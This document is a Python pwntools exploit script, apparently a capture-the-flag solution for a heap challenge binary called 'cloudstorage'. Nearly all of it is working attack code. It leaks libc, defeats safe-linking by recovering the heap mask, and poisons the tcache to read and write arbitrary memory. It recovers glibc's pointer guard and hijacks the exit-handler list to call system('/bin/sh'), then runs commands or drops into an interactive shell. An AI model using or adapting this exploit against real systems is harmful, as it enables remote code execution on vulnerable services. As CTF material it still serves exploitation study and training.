#!/usr/bin/env python3
import os
import sys

from pwn import context, log, p64, process, remote, u64


HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "extracted/cloudstorage")
LD = os.path.join(HERE, "extracted/ld-linux-x86-64.so.2")
LIBDIR = os.path.join(HERE, "extracted")

DEFAULT_HOST = "7d86b20d75e30941.chal.ctf.ae"
DEFAULT_PORT = 443

LIBC_LEAK_OFF = 0x203B20
RTLD_GLOBAL_PTR = 0x2046B8
RTLD_GLOBAL_OFF = 0x38000
DL_FINI_OFF = 0x5380
EXIT_HEAD = 0x204FC0
SYSTEM = 0x58750
BINSH = 0x1CB42F


context.log_level = os.environ.get("LOG", "info")


def unpack64(data):
    return u64(data[:8].ljust(8, b"\0"))


def rol(x, r):
    return ((x << r) & ((1 << 64) - 1)) | (x >> (64 - r))


def ror(x, r):
    return (x >> r) | ((x << (64 - r)) & ((1 << 64) - 1))


def as_bytes(value):
    if isinstance(value, int):
        return str(value).encode()
    if isinstance(value, str):
        return value.encode()
    return value


class Exploit:
    def __init__(self, io):
        self.io = io
        self.next_slot = 3

    def ru(self, token):
        return self.io.recvuntil(token, timeout=5)

    def sl(self, value):
        self.io.sendline(as_bytes(value))

    def create(self, align, size):
        self.sl(1)
        self.ru(b": ")
        self.sl(align)
        self.ru(b": ")
        self.sl(size)
        return self.ru(b"> ")

    def delete(self, idx):
        self.sl(4)
        self.ru(b": ")
        self.sl(idx)
        return self.ru(b"> ")

    def compact(self):
        self.sl(7)
        return self.ru(b"> ")

    def readblk(self, idx):
        self.sl(3)
        self.ru(b": ")
        self.sl(idx)
        out = self.ru(b"--- Storage Operations ---")
        self.ru(b"> ")
        return out.split(b":\n", 1)[1].split(b"\n--- Storage Operations ---", 1)[0]

    def writeblk(self, idx, data, wait=True):
        if b"\n" in data:
            raise ValueError("payload contains newline; rerun for different ASLR")
        self.sl(2)
        self.ru(b": ")
        self.sl(idx)
        self.ru(b": ")
        self.io.send(data + b"\n")
        if wait:
            return self.ru(b"> ")
        return b""

    def leak_libc(self):
        self.create(0x20000, 0xFFFF0000)
        self.create(16, 0x500)
        self.create(16, 0x100)
        self.delete(1)
        self.compact()
        return unpack64(self.readblk(0)[8:16]) - LIBC_LEAK_OFF

    def init_tcache_poison(self):
        self.create(16, 0x30)
        self.delete(1)
        self.compact()
        mask = unpack64(self.readblk(0)[8:16])
        self.create(16, 0x30)
        return mask

    def poison(self, target):
        self.create(16, 0x30)
        y = self.next_slot
        self.delete(1)
        self.delete(y)
        self.compact()
        self.writeblk(0, p64(0x51) + p64(target ^ self.mask))
        self.create(16, 0x30)
        self.create(16, 0x30)
        self.next_slot += 1
        return y

    def run(self):
        self.ru(b"> ")

        self.libc = self.leak_libc()
        log.success(f"libc = {self.libc:#x}")

        self.mask = self.init_tcache_poison()
        log.success(f"heap mask = {self.mask:#x}")

        head = self.libc + EXIT_HEAD

        # The service returns block+0x18 as user data. Targeting head+8-0x18
        # makes reads/writes line up with idx and the first exit function entry.
        exit_idx = self.poison(head + 8 - 0x18)
        exit_tail = self.readblk(exit_idx)
        mangled_dl_fini = unpack64(exit_tail[0x10:0x18])
        log.success(f"mangled _dl_fini = {mangled_dl_fini:#x}")

        # Leak this last: fake metadata around __nptl_rtld_global can disturb
        # allocator/libc state enough that later mallocs may abort.
        rtld_idx = self.poison(self.libc + RTLD_GLOBAL_PTR - 0x18)
        rtld_global = unpack64(self.readblk(rtld_idx))
        ld_base = rtld_global - RTLD_GLOBAL_OFF
        guard = ror(mangled_dl_fini, 17) ^ (ld_base + DL_FINI_OFF)
        log.success(f"ld = {ld_base:#x}")
        log.success(f"pointer guard = {guard:#x}")

        system_mangled = rol((self.libc + SYSTEM) ^ guard, 17)
        payload = (
            p64(1)
            + p64(4)
            + p64(system_mangled)
            + p64(self.libc + BINSH)
            + p64(0)
        )
        self.writeblk(exit_idx, payload)
        self.sl(9)


def parse_target(argv):
    if not argv or argv[0] == "local":
        return False, None, None, argv[1:] if argv else []

    if argv[0] == "remote":
        if len(argv) >= 3 and argv[2].isdigit():
            host = argv[1]
            port = int(argv[2])
            command = argv[3:]
        else:
            host = DEFAULT_HOST
            port = DEFAULT_PORT
            command = argv[1:]
        return True, host, port, command

    if len(argv) >= 2 and argv[1].isdigit():
        return True, argv[0], int(argv[1]), argv[2:]

    return True, argv[0], DEFAULT_PORT, argv[1:]


def start(remote_mode, host, port):
    if remote_mode:
        use_ssl = port == 443
        log.info(f"connecting to {host}:{port} ssl={use_ssl}")
        return remote(host, port, ssl=use_ssl, sni=host if use_ssl else None)

    argv = [LD, "--library-path", LIBDIR, BIN]
    log.info("starting local process with shipped loader/libc")
    return process(argv, cwd=HERE)


def main():
    remote_mode, host, port, command = parse_target(sys.argv[1:])
    io = start(remote_mode, host, port)
    Exploit(io).run()

    if command:
        io.sendline(" ".join(command).encode())
        sys.stdout.buffer.write(io.recvrepeat(2))
        return

    io.interactive()


if __name__ == "__main__":
    main()
